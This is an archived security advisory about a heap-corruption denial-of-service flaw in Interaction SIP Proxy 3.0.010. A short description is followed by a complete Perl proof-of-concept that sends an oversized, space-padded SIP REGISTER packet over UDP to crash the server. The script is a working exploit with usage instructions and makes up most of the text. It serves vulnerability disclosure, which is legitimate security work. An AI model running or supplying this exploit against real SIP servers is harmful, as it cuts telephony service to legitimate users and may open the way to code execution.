source: http://www.securityfocus.com/bid/16001/info

Interaction SIP Proxy is susceptible to a remote denial of service vulnerability. This issue is due to a failure of the application to properly bounds check user-supplied input data, resulting in a heap memory corruption.

This issue allows remote attackers to crash the affected server application, denying further telephony service to legitimate users. It may be possible to exploit this issue for remote code execution, but this has not been confirmed.

Version 3.0.010 of Interaction SIP Proxy is vulnerable to this issue; other versions may also be affected. 

#! /usr/bin/perl

##
#i3 SIP Proxy POC - http://www.hat-squad.com/en/000171.html
#This vulnerability allows a remote user to overwrite heap memory of i3sipproxy.
#The request size varies, but size=2900 bytes works in most of the cases. Successful
#exploitation of this bug for code executuion requires a magic combination of 
#pre-allocations, data and size.
#
 
use strict; 
use IO::Socket::INET;

my $host = shift(@ARGV); 
my $size = shift(@ARGV);
my $port=5060;

print "\n\n Interactive SIP proxy heap corruption POC \n\n";
print " By Behrang Fouladi, Hat-Squad Security Team \n\n";
print(" Usage: perl $0 <target> <size> \n\n"),exit if(!$host || !$size);
my $iaddr=inet_aton($host) || die ("Unable to resolve $host");

socket(DoS,PF_INET,SOCK_DGRAM,17);

my $sip= "REGISTER sip:test\@test.com SIP/";
$sip.= "\x20"x$size;
$sip.= "\r\n";
$sip.= "Via: SIP/2.0/TCP 192.168.0.1:7043";
$sip.= "\r\n";
$sip.= "Max-Forwards: 70\r\n";
$sip.= "From: <sip:test\@test.com>;tag=ec8c2399e9\r\n";
$sip.= "To: <sip:test\@test.com>\r\n";
$sip.= "Call-ID: 1b6c7397b109453c93d85edc88d9810e\r\n";
$sip.= "CSeq: 1 REGISTER\r\n";
$sip.= "Contact: <sip:test\@test.com;transport=udp>;methods=\"INVITE, MESSAGE, INFO, SUBSCRIBE, OPTIONS, BYE, CANCEL, NOTIFY, ACK, REFER, BENOTIFY\";proxy=replace\r\n";
$sip.= "Content-Length: 0\r\n";
$sip.= "\r\n";

send(DoS,$sip,0,sockaddr_in($port,$iaddr));
print " Exploit Sent to $host...\n";
print " The SIP Proxy should crash now.\n\n";
exit(0);
